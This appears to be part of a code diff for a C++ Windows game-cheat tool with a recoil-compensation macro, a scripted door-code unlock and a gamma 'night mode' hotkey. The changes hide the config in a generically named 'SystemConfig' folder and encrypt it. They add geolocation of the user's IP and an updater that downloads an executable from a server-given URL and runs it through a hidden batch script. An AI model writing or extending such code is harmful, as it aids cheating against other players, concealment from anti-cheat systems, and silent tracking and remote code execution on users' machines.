-                output_log_message("Loaded Interception driver installation status: " + std::string(g_interception_driver_installed ? "Installed" : "Not Installed") + "\n");
-            }
-        }
+        // Legacy driver status is no longer used
 
         // --- Load Remember Me Settings ---
         if (config_json.contains("Login")) {
@@ -2266,38 +3428,46 @@ void load_config() {
     } catch (const nlohmann::json::parse_error& e) { // Use explicit namespace
         std::cerr << "Warning: config.json parse error: " << e.what() << ". Using default settings." << std::endl;
         output_log_message("Warning: config.json parse error.\n");
+        set_ui_notice(UINoticeLevel::Warning,
+                      "Settings",
+                      "Settings file is corrupted. Defaults were loaded.",
+                      std::string("Config path: ") + config_path);
         // On parse error, defaults initialized earlier will be used.
     } catch (const std::exception& e) {
         std::cerr << "Warning: Error loading config.json: " << e.what() << ". Using default settings." << std::endl;
         output_log_message("Warning: Error loading config.json.\n");
+        set_ui_notice(UINoticeLevel::Warning,
+                      "Settings",
+                      "Could not load settings. Defaults were loaded.",
+                      std::string("Config path: ") + config_path);
         // On other errors, defaults initialized earlier will be used.
     }
 
     output_log_message("Initial config loaded from config.json. SENSITIVITY: " + std::to_string(SENSITIVITY) + ", FOV: " + std::to_string(FOV) + ", Base Multiplier=" + std::to_string(screenMultiplier) + ", Door Code=" + std::to_string(g_door_unlock_code) + ", Door Trigger=" + vk_code_to_string(g_door_unlock_trigger_key) + ", Sound Enabled=" + (g_sound_enabled.load() ? "true" : "false") + "\n");
 }
 
-// ایجاد مسیر کامل برای فایل config.json در پوشه Documents کاربر
-std::string get_config_path() {
+std::string get_appdata_config_path() {
     char path[MAX_PATH];
-    // دریافت مسیر پوشه Documents کاربر
-    if (SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, 0, path) == S_OK) {
-        std::string docs_path(path);
-        // ایجاد پوشه برنامه اگر وجود نداشته باشد
-        std::string app_folder = docs_path + "\\TeaRCore";
-        CreateDirectoryA(app_folder.c_str(), NULL);
-        return app_folder + "\\config.json";
+    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path) != S_OK) {
+        return "";
     }
-    
-    // اگر نتوانستیم مسیر Documents را پیدا کنیم، از مسیر اجرای برنامه استفاده می‌کنیم
-    if (GetModuleFileNameA(NULL, path, MAX_PATH) != 0) {
-        std::string exe_path(path);
-        size_t pos = exe_path.find_last_of("\\");
-        if (pos != std::string::npos) {
-            return exe_path.substr(0, pos + 1) + "config.json";
-        }
+
+    std::string base_path(path);
+    // نام پوشه را عمومی/سیستمی نگه می‌داریم، نه با نام برنامه
+    std::string app_folder = base_path + "\\SystemConfig";
+    CreateDirectoryA(app_folder.c_str(), NULL);
+    return app_folder + "\\config.json";
+}
+
+// ایجاد مسیر کامل برای فایل config.json (مسیر اصلی)
+std::string get_config_path() {
+    // فقط مسیر AppData را به عنوان محل اصلی برمی‌گردانیم
+    std::string appdata_config = get_appdata_config_path();
+    if (!appdata_config.empty()) {
+        return appdata_config;
     }
-    
-    // اگر هیچ کدام از روش‌ها موفق نبود، به مسیر پیش‌فرض برمی‌گردیم
+
+    // اگر به هر دلیل AppData در دسترس نبود، آخرین fallback یک فایل نسبی است
     return "config.json";
 }
 
@@ -2315,12 +3485,32 @@ void AutoSaveIfEnabled() {
 
 void save_config() {
     std::string config_path = get_config_path();
+    if (config_path.empty()) {
+        output_log_message("Error: get_config_path() returned empty. Cannot save config.\n");
+        return;
+    }
+
     std::ofstream config_file(config_path);
+    if (!config_file.is_open()) {
+        // اگر نتوانستیم باز کنیم، تلاش می‌کنیم فایل قبلی را (در همین مسیر) پاک کنیم و دوباره بسازیم
+        DWORD attrs = GetFileAttributesA(config_path.c_str());
+        if (attrs != INVALID_FILE_ATTRIBUTES) {
+            // حذف پرچم ReadOnly در صورت وجود
+            if (attrs & FILE_ATTRIBUTE_READONLY) {
+                SetFileAttributesA(config_path.c_str(), attrs & ~FILE_ATTRIBUTE_READONLY);
+            }
+            DeleteFileA(config_path.c_str());
+        }
+        config_file.open(config_path);
+    }
+
     if (!config_file.is_open()) {
         std::cerr << "Error: Could not open " << config_path << " for saving." << std::endl;
         output_log_message("Error: Could not save to " + config_path + "\n");
         return;
     }
+
+    output_log_message("Saving config to " + config_path + "...\n");
 
     nlohmann::json config_json; // Use explicit namespace
 
@@ -2330,6 +3520,7 @@ void save_config() {
     config_json["Settings"]["SoundEnabled"] = g_sound_enabled.load();
     config_json["Settings"]["AutoCrouchScopeEnabled"] = g_auto_crouch_scope_enabled.load();
     config_json["Settings"]["AutoSaveEnabled"] = AUTO_SAVE_ENABLED; // ذخیره تنظیمات Auto Save
+    config_json["Settings"]["TotalUsageSeconds"] = g_total_usage_seconds;
     
     // --- Save Theme Settings ---
     config_json["Theme"]["BackgroundColor"][0] = g_theme_settings.background_color.x;
@@ -2397,9 +3588,6 @@ void save_config() {
     config_json["DoorUnlocker"]["Code"] = g_door_unlock_code;
     config_json["DoorUnlocker"]["TriggerKey"] = vk_code_to_string(g_door_unlock_trigger_key);
 
-    // --- Save Interception Driver Installation Status ---
-    config_json["Interception"]["DriverInstalled"] = g_interception_driver_installed;
-
     // --- Save Remember Me Settings ---
     config_json["Login"]["RememberMe"] = g_remember_me;
     if (g_remember_me) {
@@ -2440,24 +3628,38 @@ void save_config() {
     // ذخیره پروفایل فعلی
     config_json["CurrentProfile"] = current_gun_profile_str;
 
-    // Write JSON to file with pretty printing
-    config_file << config_json.dump(4) << std::endl; // Use 4 spaces for indentation
-    config_file.close();
-
-    // Set the hidden attribute for the config file
-    if (SetFileAttributesW(L"config.json", FILE_ATTRIBUTE_HIDDEN) != 0) {
-        // Success
-         output_log_message("Successfully set config.json to hidden.\n");
-    } else {
-        // Error handling if setting attribute fails
-        DWORD error = GetLastError();
-        std::cerr << "Error setting config.json attribute: " << error << std::endl;
-        output_log_message("Error setting config.json attribute: " + std::to_string(error) + "\n");
+    // Serialize JSON سپس رمز و در فایل بنویس
+    std::string plain_json = config_json.dump();
+    std::string encrypted_json = encrypt_config_data(plain_json);
+    if (encrypted_json.empty()) {
+        output_log_message("Error: Failed to encrypt config data. Settings not saved.\n");
+        return;
     }
 
-    output_log_message("Settings saved to config.json\n");
+    config_file << encrypted_json;
+    config_file.close();
+
+    output_log_message("Settings saved to " + config_path + "\n");
 }
 
+// --- Usage Accumulation Helper ---
+// این تابع مدت زمان سشن فعلی (از لحظه لاگین تا خروج) را به g_total_usage_seconds اضافه کرده و سپس config را ذخیره می‌کند
+void accumulate_usage_and_save() {
+    // فقط اگر کاربر در این سشن لاگین بوده است
+    if (g_isLoggedIn.load(std::memory_order_relaxed)) {
+        // اگر زمان شروع سشن مقداردهی شده باشد
+        if (g_session_start_time.time_since_epoch().count() != 0) {
+            auto now = std::chrono::steady_clock::now();
+            auto delta = std::chrono::duration_cast<std::chrono::seconds>(now - g_session_start_time).count();
+            if (delta > 0) {
+                g_total_usage_seconds += delta;
+            }
+        }
+    }
+
+    // ذخیره config با مقدار به‌روز شده
+    save_config();
+}
 
 // --- Theme Functions ---
 
@@ -2618,8 +3820,45 @@ RecoilProfileData calculate_recoil_profile(
 }
 
 
+// اطمینان از این‌که وکتورهای per-gun از recoil_tables پر شده‌اند
+static void ensure_recoil_offsets_initialized() {
+    if (AK47_BULLETS > 0) {
+        // قبلاً مقداردهی شده‌اند
+        return;
+    }
+
+    auto fill_from_table = [](WeaponIndex idx,
+                              std::vector<double>& out_x,
+                              std::vector<double>& out_y,
+                              int& out_bullets)
+    {
+        out_x.clear();
+        out_y.clear();
+        const auto& tbl = recoil_tables[idx];
+        out_x.reserve(tbl.size());
+        out_y.reserve(tbl.size());
+        for (const auto& p : tbl) {
+            out_x.push_back(p[0]);
+            out_y.push_back(p[1]);
+        }
+        out_bullets = static_cast<int>(tbl.size());
+    };
+
+    fill_from_table(WEAPON_AK47,    AK47_OFFSET_X,    AK47_OFFSET_Y,    AK47_BULLETS);
+    fill_from_table(WEAPON_LR300,   LR300_OFFSET_X,   LR300_OFFSET_Y,   LR300_BULLETS);
+    fill_from_table(WEAPON_THOMPSON,THOMPSON_OFFSET_X,THOMPSON_OFFSET_Y,THOMPSON_BULLETS);
+    fill_from_table(WEAPON_SEMI,    SAR_OFFSET_X,     SAR_OFFSET_Y,     SAR_BULLETS);
+    fill_from_table(WEAPON_MP5,     MP5A4_OFFSET_X,   MP5A4_OFFSET_Y,   MP5A4_BULLETS);
+    fill_from_table(WEAPON_HMLMG,   HMLMG_OFFSET_X,   HMLMG_OFFSET_Y,   HMLMG_BULLETS);
+    fill_from_table(WEAPON_M249,    M249_OFFSET_X,    M249_OFFSET_Y,    M249_BULLETS);
+    fill_from_table(WEAPON_CUSTOM,  CUSTOM_OFFSET_X,  CUSTOM_OFFSET_Y,  CUSTOM_BULLETS);
+    fill_from_table(WEAPON_PYTHON,  PYTHON_OFFSET_X,  PYTHON_OFFSET_Y,  PYTHON_BULLETS);
+}
+
 // Recalculates ALL profiles based on current SENS/FOV and attachment states
 void recalculate_all_profiles_threadsafe() {
+    // ابتدا از مقداردهی شدن وکتورهای ریکویل بر اساس جدول جدید مطمئن می‌شویم
+    ensure_recoil_offsets_initialized();
     // Calculate screen multiplier based on sensitivity and FOV
     // This is a critical calculation that affects all recoil patterns
     if (FOV <= 0) {
@@ -2628,7 +3867,7 @@ void recalculate_all_profiles_threadsafe() {
     } else {
          // Formula matching interseption.cpp: -0.03 * (SENSITIVITY * 3.0) * (FOV / 100.0)
          // This value will be used for DIVISION, not multiplication in compensation calculations
-         screenMultiplier = -0.03 * ((SENSITIVITY+1.1) * 3.0) * (FOV / 100.0);
+         screenMultiplier = -0.03 * ((SENSITIVITY) * 3.0 ) * (FOV / 100.0);
     }
      output_log_message("Recalculating profiles with Sens=" + std::to_string(SENSITIVITY) + ", FOV=" + std::to_string(FOV) + ", Base Multiplier=" + std::to_string(screenMultiplier) + "\n");
 
@@ -2672,6 +3911,18 @@ void recalculate_all_profiles_threadsafe() {
         g_attachment_states[PROFILE_M249], // Pass the struct
         false); // M249 is not SAR
 
+    // پروفایل اسلحه جدید Custom SMG
+    calculated_profiles[PROFILE_CUSTOM] = calculate_recoil_profile(
+        CUSTOM_OFFSET_X, CUSTOM_OFFSET_Y, CUSTOM_BULLETS, CUSTOM_RPM_DELAY,
+        g_attachment_states[PROFILE_CUSTOM],
+        false); // SMG است، شبیه بقیه اتوماتیک‌ها
+
+    // پروفایل Python (ریوالور – نیمه‌اتوماتیک)
+    calculated_profiles[PROFILE_PYTHON] = calculate_recoil_profile(
+        PYTHON_OFFSET_X, PYTHON_OFFSET_Y, PYTHON_BULLETS, PYTHON_RPM_DELAY,
+        g_attachment_states[PROFILE_PYTHON],
+        true); // مثل SAR به‌عنوان سلاح نیمه‌اتوماتیک در نظر گرفته می‌شود
+
 
     output_log_message("Recoil profiles recalculated.\n");
     // Mutex automatically released when lock goes out of scope
@@ -2684,7 +3935,7 @@ void perform_recoil_control() {
     // Recoil thread log removed
 
     // Outer loop: Continuously checks for activation conditions
-    while (true) {
+    while (g_recoil_thread_should_run.load(std::memory_order_relaxed)) {
         // 1. Check Global State (License, Global Toggle) - Run at the beginning of each major cycle
         auto now_global = std::chrono::system_clock::now();
         // Read license data safely
@@ -2718,6 +3969,9 @@ void perform_recoil_control() {
         // 2. Wait for Initial Trigger (RMB down)
         // Recoil thread log removed
         while (!right_mouse_down.load(std::memory_order_relaxed)) {
+            if (!g_recoil_thread_should_run.load(std::memory_order_relaxed)) {
+                return; // Thread is being asked to stop
+            }
             sleep_ms(5);
             // Periodically re-check global state while waiting for RMB
             auto now_wait_rmb = std::chrono::system_clock::now();
@@ -2742,6 +3996,9 @@ void perform_recoil_control() {
 
         // Loop while RMB is held down
         while (right_mouse_down.load(std::memory_order_relaxed)) {
+            if (!g_recoil_thread_should_run.load(std::memory_order_relaxed)) {
+                return; // Thread is being asked to stop
+            }
 
             // 3a. Check Global State within RMB loop
             auto now_rmb_held = std::chrono::system_clock::now();
@@ -2812,6 +4069,9 @@ void perform_recoil_control() {
             // Recoil thread log removed
             bool exit_spray_loop_completely = false; // Flag to indicate if we should exit the outer RMB-held loop
             for (size_t bullet_index = 0; bullet_index < static_cast<size_t>(current_profile_local.bullets); ++bullet_index) {
+                if (!g_recoil_thread_should_run.load(std::memory_order_relaxed)) {
+                    return; // Thread is being asked to stop
+                }
 
                 // Read current state of mouse buttons at the start of each bullet iteration
                 bool lmb_down_current = left_mouse_down.load(std::memory_order_relaxed);
@@ -2970,7 +4230,7 @@ void perform_door_unlock_sequence(int key_code) {
     // Sequence of actions based on Lua code
     press_key_vk('E'); // Press 'E' key using character literal
     sleep_ms(250);
-    move_mouse_relative_interception(50, 50);
+    move_mouse_relative_core(50, 50);
     sleep_ms(70);
     press_key_vk(VK_LBUTTON); // Press Left Mouse Button
     sleep_ms(1);
@@ -3080,6 +4340,24 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
              }
 
 
+            if (vkCode == g_nightModeKey.load(std::memory_order_relaxed)) {
+                if (!toggle_key_states[vkCode]) {
+                    if (g_isLoggedIn.load(std::memory_order_relaxed)) {
+                        if (!g_isGammaInitialized) {
+                            InitializeGammaControls();
+                        }
+
+                        if (g_isGammaInitialized) {
+                            g_isGammaBoosted = !g_isGammaBoosted;
+                            ApplyCurrentGammaRamp();
+                        }
+                    }
+
+                    toggle_key_states[vkCode] = true;
+                }
+                return CallNextHookEx(keyboard_hook, nCode, wParam, lParam);
+            }
+
             // Normal key handling when not capturing (only process if licensed AND not expired)
             auto now = std::chrono::system_clock::now();
             auto expiration_time = g_activation_time + std::chrono::seconds(g_subscription_duration_seconds);
@@ -3137,12 +4415,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
                         std::string current_profile_name = current_gun_profile_str;
 
                         // Toggle logic: If currently active with this profile, deactivate. Otherwise, activate with this profile.
-                        if (current_active_state && current_profile_name == target_profile) {
-                            profile_macro_active.store(false);
-                            current_gun_profile_str = "";
-                            stop_recoil_flag.store(true); // Stop any ongoing spray
-                            output_log_message("MACRO-OFF (Profile deselected)\n");
-                        } else {
+                        if (!(current_active_state && current_profile_name == target_profile)) {
                             profile_macro_active.store(true);
                             current_gun_profile_str = target_profile;
                             output_log_message(current_gun_profile_str + "_MACRO-ON (Profile selected)\n");
@@ -3590,6 +4863,37 @@ static void HelpMarker(const char* desc)
     }
 }
 
+[[maybe_unused]] static bool ToggleSwitch(const char* str_id, bool* v)
+{
+    ImVec2 p = ImGui::GetCursorScreenPos();
+    float height = ImGui::GetFrameHeight();
+    float width = height * 1.80f;
+    float radius = height * 0.5f;
+
+    ImGui::InvisibleButton(str_id, ImVec2(width, height));
+    bool clicked = ImGui::IsItemClicked();
+    if (clicked) {
+        *v = !*v;
+    }
+
+    ImDrawList* draw_list = ImGui::GetWindowDrawList();
+
+    ImU32 col_bg;
+    if (*v) {
+        col_bg = ImGui::GetColorU32(ImVec4(0.30f, 0.75f, 0.35f, 1.00f));
+    } else {
+        col_bg = ImGui::GetColorU32(ImVec4(0.35f, 0.35f, 0.35f, 1.00f));
+    }
+
+    draw_list->AddRectFilled(p, ImVec2(p.x + width, p.y + height), col_bg, radius);
+
+    float t = *v ? 1.0f : 0.0f;
+    float cx = p.x + radius + t * (width - 2.0f * radius);
+    draw_list->AddCircleFilled(ImVec2(cx, p.y + radius), radius - 2.0f, ImGui::GetColorU32(ImVec4(1, 1, 1, 1)));
+
+    return clicked;
+}
+
 
 // --- System Info and Webhook Functions ---
 
@@ -3672,6 +4976,63 @@ inline std::string get_user_ip() {
 
     InternetCloseHandle(hInternet);
     return ip;
+}
+
+inline std::string get_country_name_for_ip(const std::string& ip) {
+    if (ip.empty() || ip == "Unknown" || ip == "unknown_ip") {
+        return "Unknown";
+    }
+
+    try {
+        std::string url = "http://ip-api.com/json/" + ip + "?fields=status,country,regionName,city,message";
+        std::string response = HttpGetToString(url.c_str());
+
+        if (response.empty()) {
+            output_log_message("GeoIP: empty response from ip-api.com for IP: " + ip + "\n");
+            return "Unknown";
+        }
+
+        auto j = nlohmann::json::parse(response);
+        if (j.value("status", std::string("fail")) != "success") {
+            std::string errMsg = j.value("message", std::string());
+            if (!errMsg.empty()) {
+                output_log_message("GeoIP: ip-api.com status != success for IP " + ip + ", message: " + errMsg + "\n");
+            } else {
+                output_log_message("GeoIP: ip-api.com status != success for IP " + ip + ", raw response: " + response + "\n");
+            }
+            return "Unknown";
+        }
+
+        std::string country = j.value("country", std::string());
+        std::string region = j.value("regionName", std::string());
+        std::string city = j.value("city", std::string());
+
+        std::string full;
+        if (!country.empty()) {
+            full = country;
+        }
+        if (!region.empty()) {
+            if (!full.empty()) full += ", ";
+            full += region;
+        }
+        if (!city.empty()) {
+            if (!full.empty()) full += ", ";
+            full += city;
+        }
+
+        if (full.empty()) {
+            output_log_message("GeoIP: ip-api.com returned success but country/region/city are empty for IP: " + ip + "\n");
+            return "Unknown";
+        }
+
+        return full;
+    } catch (const std::exception& ex) {
+        output_log_message(std::string("GeoIP: exception while handling ip-api.com response for IP ") + ip + ": " + ex.what() + "\n");
+    } catch (...) {
+        output_log_message("GeoIP: unknown exception while handling ip-api.com response.\n");
+    }
+
+    return "Unknown";
 }
 
 // Function to get current computer name
@@ -4151,6 +5512,213 @@ void send_webhook_message(const std::string& webhook_url, const json& payload_js
     InternetCloseHandle(hInternet);
 }
 
+// Helper function to download a file from a URL to a destination path using WinINet
+bool download_file(const std::string& url, const std::string& dest_path) {
+    HINTERNET hInternet = InternetOpenA("CoreUpdateDownloader", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    if (!hInternet) {
+        output_log_message("Download: InternetOpenA failed.\n");
+        return false;
+    }
+
+    HINTERNET hFile = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0,
+                                       INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_PRAGMA_NOCACHE,
+                                       0);
+    if (!hFile) {
+        output_log_message("Download: InternetOpenUrlA failed.\n");
+        InternetCloseHandle(hInternet);
+        return false;
+    }
+
+    // Reset progress counters
+    g_update_bytes_downloaded.store(0, std::memory_order_relaxed);
+    g_update_bytes_total.store(0, std::memory_order_relaxed);
+
+    // Try to read Content-Length header to know total size
+    DWORD content_length = 0;
+    DWORD header_size = sizeof(content_length);
+    if (HttpQueryInfoA(hFile, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER,
+                       &content_length, &header_size, NULL)) {
+        g_update_bytes_total.store(static_cast<long long>(content_length), std::memory_order_relaxed);
+    }
+
+    std::ofstream out(dest_path, std::ios::binary);
+    if (!out) {
+        output_log_message("Download: Failed to open destination file: " + dest_path + "\n");
+        InternetCloseHandle(hFile);
+        InternetCloseHandle(hInternet);
+        return false;
+    }
+
+    const DWORD BUF_SIZE = 4096;
+    char buffer[BUF_SIZE];
+    DWORD bytes_read = 0;
+    bool ok = true;
+    long long downloaded = 0;
+
+    while (true) {
+        if (!InternetReadFile(hFile, buffer, BUF_SIZE, &bytes_read)) {
+            DWORD err = GetLastError();
+            output_log_message("Download: InternetReadFile failed. Error: " + std::to_string(err) + "\n");
+            ok = false;
+            break; // Network/read error
+        }
+
+        if (bytes_read == 0) {
+            // Normal end of file
+            break;
+        }
+
+        out.write(buffer, bytes_read);
+        if (!out) {
+            ok = false;
+            break;
+        }
+
+        downloaded += bytes_read;
+        g_update_bytes_downloaded.store(downloaded, std::memory_order_relaxed);
+    }
+
+    out.close();
+    InternetCloseHandle(hFile);
+    InternetCloseHandle(hInternet);
+
+    if (!ok) {
+        output_log_message("Download: Error while writing file: " + dest_path + "\n");
+        return false;
+    }
+
+    // Ensure progress counters reflect the final file size, even if Content-Length was not available
+    try {
+        auto final_size = std::filesystem::file_size(dest_path);
+        g_update_bytes_downloaded.store(static_cast<long long>(final_size), std::memory_order_relaxed);
+        long long total = g_update_bytes_total.load(std::memory_order_relaxed);
+        if (total <= 0) {
+            g_update_bytes_total.store(static_cast<long long>(final_size), std::memory_order_relaxed);
+        }
+    } catch (...) {
+        // Ignore file_size errors; progress bar will just show bytes read during streaming
+    }
+
+    output_log_message("Download: File downloaded to " + dest_path + "\n");
+    return true;
+}
+
+// Shared helper to handle "Need Donwload New Version App (Check Discord)" responses
+// from the license/check API. It sets global update flags, downloads the new
+// version, prepares the updater script, and fills an error message for the UI.
+void handle_update_required_from_server(const std::string& details_str, std::string& out_error_message) {
+    if (details_str.empty()) {
+        std::lock_guard<std::mutex> lock(g_login_error_mutex);
+        out_error_message = "Update required, but no download URL was provided by the server.";
+        return;
+    }
+
+    // details may be either just a URL, or "URL|NEW_VERSION"
+    std::string download_url = details_str;
+    std::string new_version_str;
+    size_t pipe_pos = details_str.find('|');
+    if (pipe_pos != std::string::npos) {
+        download_url = details_str.substr(0, pipe_pos);
+        if (pipe_pos + 1 < details_str.size()) {
+            new_version_str = details_str.substr(pipe_pos + 1);
+        }
+    }
+
+    {
+        std::lock_guard<std::mutex> lock(g_update_mutex);
+        g_update_download_url = download_url;
+        g_update_download_error.clear();
+        g_update_download_path.clear();
+        g_update_new_version = new_version_str;
+    }
+
+    g_update_required.store(true, std::memory_order_relaxed);
+    g_update_download_in_progress.store(true, std::memory_order_relaxed);
+    g_update_download_done.store(false, std::memory_order_relaxed);
+    g_update_download_failed.store(false, std::memory_order_relaxed);
+
+    // Choose a download destination in the temp directory
+    char temp_path[MAX_PATH];
+    DWORD len = GetTempPathA(MAX_PATH, temp_path);
+    std::string dest_path;
+    if (len > 0 && len < MAX_PATH) {
+        dest_path = std::string(temp_path) + "Core_Update.exe";
+    } else {
+        dest_path = "Core_Update.exe";
+    }
+
+    bool ok = download_file(download_url, dest_path);
+    {
+        std::lock_guard<std::mutex> lock(g_update_mutex);
+        if (ok) {
+            g_update_download_done.store(true, std::memory_order_relaxed);
+            g_update_download_failed.store(false, std::memory_order_relaxed);
+            g_update_download_path = dest_path;
+        } else {
+            g_update_download_done.store(false, std::memory_order_relaxed);
+            g_update_download_failed.store(true, std::memory_order_relaxed);
+            g_update_download_error = "Failed to download new version.";
+        }
+        g_update_download_in_progress.store(false, std::memory_order_relaxed);
+    }
+
+    // If download succeeded, prepare an updater script that will run after the app exits.
+    if (ok) {
+        char current_path[MAX_PATH];
+        DWORD cur_len = GetModuleFileNameA(NULL, current_path, MAX_PATH);
+        if (cur_len > 0 && cur_len < MAX_PATH) {
+            std::string current_exe = std::string(current_path);
+            // Build backup path in same folder (keep old exe as .bak for now)
+            std::string backup_exe = current_exe + ".bak";
+
+            // Build updater .bat in temp folder
+            std::string bat_path;
+            if (len > 0 && len < MAX_PATH) {
+                bat_path = std::string(temp_path) + "Core_UpdateRunner.bat";
+            } else {
+                bat_path = "Core_UpdateRunner.bat";
+            }
+
+            try {
+                std::ofstream bat(bat_path, std::ios::trunc);
+                if (bat) {
+                    bat << "@echo off\r\n";
+                    bat << ":wait\r\n";
+                    bat << "timeout /t 1 /nobreak >nul\r\n";
+                    // Copy current exe to backup; if it fails (file in use), wait and retry
+                    bat << "copy /y \"" << current_exe << "\" \"" << backup_exe << "\" >nul 2>&1\r\n";
+                    bat << "if errorlevel 1 goto wait\r\n";
+                    // Copy new exe over current exe; if it fails (still in use), wait and retry
+                    bat << "copy /y \"" << dest_path << "\" \"" << current_exe << "\" >nul 2>&1\r\n";
+                    bat << "if errorlevel 1 goto wait\r\n";
+                    // Start updated app
+                    bat << "start \"\" \"" << current_exe << "\"\r\n";
+                    bat << "exit\r\n";
+                    bat.close();
+
+                    // Launch updater script hidden; it will wait until this exe is closed
+                    ShellExecuteA(NULL, "open", bat_path.c_str(), NULL, NULL, SW_HIDE);
+                    output_log_message("Update runner script created and launched: " + bat_path + "\n");
+                }
+            } catch (...) {
+                output_log_message("Failed to create or launch update runner script.\n");
+            }
+        }
+
+        // Request application exit so the updater script can replace and restart the app automatically
+        g_exit_after_update.store(true, std::memory_order_relaxed);
+    }
+
+    {
+        std::lock_guard<std::mutex> lock(g_login_error_mutex);
+        if (g_update_download_done.load(std::memory_order_relaxed)) {
+            out_error_message = "New version has been downloaded. The application will now close and restart automatically.";
+        } else {
+            out_error_message = "Update required.\nFailed to download the new version automatically.";
+        }
+    }
+}
+
 // --- تابع چک کردن لایسنس ---
 // این تابع حالا پارامتر خروجی برای start_license دارد
 bool check_license_socket_simulated(const std::string& license_key, long long& out_duration_seconds, std::string& out_error_message, std::string& out_start_license) {
@@ -4171,46 +5739,31 @@ bool check_license_socket_simulated(const std::string& license_key, long long& o
 
     // گرفتن Device ID پیچیده شده (هش شده)
     std::string device_id_hashed = generate_device_id();
-
-    // ساختن آدرس API با کلید لایسنس خام و Device ID هش شده
-    std::string base_api_url = "https://script.google.com/macros/s/AKfycbz3i2k-M4kixnZGU2Ja7-H4Yau5r1rvPyiXROZR2OKbC8DbWauRsasrZVO5uaVrzx0R0Q/exec";
-    // توجه: ما کلید لایسنس خام را به API ارسال می کنیم، اما Device ID هش شده است.
-    // سرور API شما باید انتظار Device ID هش شده را داشته باشد و آن را با Device ID های هش شده ذخیره شده مقایسه کند.
-    base_api_url += "?license=" + license_key + "&device_id=" + device_id_hashed + "&version=" + APP_VERSION_NUMBER; // پارامتر ورژن را اضافه کنید // اضافه کردن پارامترها
-
-
-    HINTERNET hInternet = InternetOpen(" Core Client", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
-    if (!hInternet) {
-        {
-            std::lock_guard<std::mutex> lock(g_login_error_mutex);
-            out_error_message = "Failed to initialize WinINet.";
-        }
-        output_log_message("Error: InternetOpen failed.\n");
-        return false;
-    }
-
-    // حالا base_api_url تعریف شده است
-    HINTERNET hConnect = InternetOpenUrl(hInternet, base_api_url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE, 0);
-    if (!hConnect) {
-        {
-            std::lock_guard<std::mutex> lock(g_login_error_mutex);
-            out_error_message = "Failed to connect to the license server.";
-        }
-        output_log_message("Error: InternetOpenUrl failed.\n");
-        InternetCloseHandle(hInternet);
-        return false;
-    }
+    std::string nonce = generate_nonce();
+    std::string timestamp = get_unix_timestamp_seconds();
 
     std::string response_body;
-    char buffer[4096];
-    DWORD bytes_read = 0;
-    while (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytes_read) && bytes_read > 0) {
-        buffer[bytes_read] = '\0';
-        response_body.append(buffer);
-    }
+    std::string http_error;
+    {
+        json request_json;
+        request_json["license"] = license_key;
+        request_json["device_id"] = device_id_hashed;
+        request_json["version"] = APP_VERSION_NUMBER;
+        request_json["nonce"] = nonce;
+        request_json["ts"] = timestamp;
 
-    InternetCloseHandle(hConnect);
-    InternetCloseHandle(hInternet);
+        if (!HttpPostJsonToString(std::string(LICENSE_API_BASE_URL), request_json.dump(), response_body, http_error)) {
+            {
+                std::lock_guard<std::mutex> lock(g_login_error_mutex);
+                out_error_message = "Failed to connect to the license server.";
+                if (!http_error.empty()) {
+                    out_error_message += " (" + http_error + ")";
+                }
+            }
+            output_log_message("Error: HttpPostJsonToString failed. " + http_error + "\n");
+            return false;
+        }
+    }
 
     output_log_message("API Response: " + response_body + "\n");
 
@@ -4224,6 +5777,16 @@ bool check_license_socket_simulated(const std::string& license_key, long long& o
 
     try {
         json json_response = json::parse(response_body);
+
+        std::string signature_error;
+        if (!verify_response_signature(json_response, LICENSE_HMAC_SECRET, nonce, signature_error)) {
+            {
+                std::lock_guard<std::mutex> lock(g_login_error_mutex);
+                out_error_message = "Invalid server signature.";
+            }
+            output_log_message("License API signature check failed: " + signature_error + "\n");
+            return false;
+        }
 
         if (json_response.contains("status") && json_response["status"] == "valid") {
             // پردازش remaining (کد موجود)
@@ -4259,15 +5822,44 @@ bool check_license_socket_simulated(const std::string& license_key, long long& o
                 output_log_message("Warning: 'used_count' not found or not an integer in API response. Using default (-1).\n");
             }
 
+            // Process plan_type (subscription vs free_trial) from server; default to subscription for paid license
+            {
+                std::lock_guard<std::mutex> lock(g_license_data_mutex);
+                if (json_response.contains("plan_type") && json_response["plan_type"].is_string()) {
+                    g_plan_type = json_response["plan_type"].get<std::string>();
+                } else {
+                    g_plan_type = "subscription";
+                }
+            }
+
             output_log_message("License is valid. Remaining time (seconds): " + std::to_string(out_duration_seconds) + "\n");
             g_isLoggedIn.store(true, std::memory_order_relaxed); // Set login status to true
             return true;
 
         } else { // status != "valid"
+            std::string message_str;
+            std::string details_str;
+
+            if (json_response.contains("message") && json_response["message"].is_string()) {
+                message_str = json_response["message"].get<std::string>();
+            }
+            if (json_response.contains("details") && json_response["details"].is_string()) {
+                details_str = json_response["details"].get<std::string>();
+            }
+
+            // Handle version-outdated case via shared helper
+            if (message_str == "Need Donwload New Version App (Check Discord)") {
+                output_log_message("License API reports outdated version. Update required.\n");
+                handle_update_required_from_server(details_str, out_error_message);
+                // Treat as failed license check so caller keeps user on login view
+                return false;
+            }
+
+            // Fallback for non-update errors: keep previous behaviour
             {
                 std::lock_guard<std::mutex> lock(g_login_error_mutex);
-                if (json_response.contains("message")) {
-                    out_error_message = json_response["message"];
+                if (!message_str.empty()) {
+                    out_error_message = message_str;
                 } else {
                     out_error_message = "Invalid license or unknown error.";
                 }
@@ -4328,6 +5920,7 @@ void fetch_announcement_async() {
 void perform_login_async(std::string license_key) {
     // ثبت زمان شروع لاگین
     auto login_start_time = std::chrono::high_resolution_clock::now();
+    (void)login_start_time;
     
     // دریافت اطلاعات سیستم برای لاگ
     char computerName[MAX_COMPUTERNAME_LENGTH + 1];
@@ -4348,17 +5941,16 @@ void perform_login_async(std::string license_key) {
     
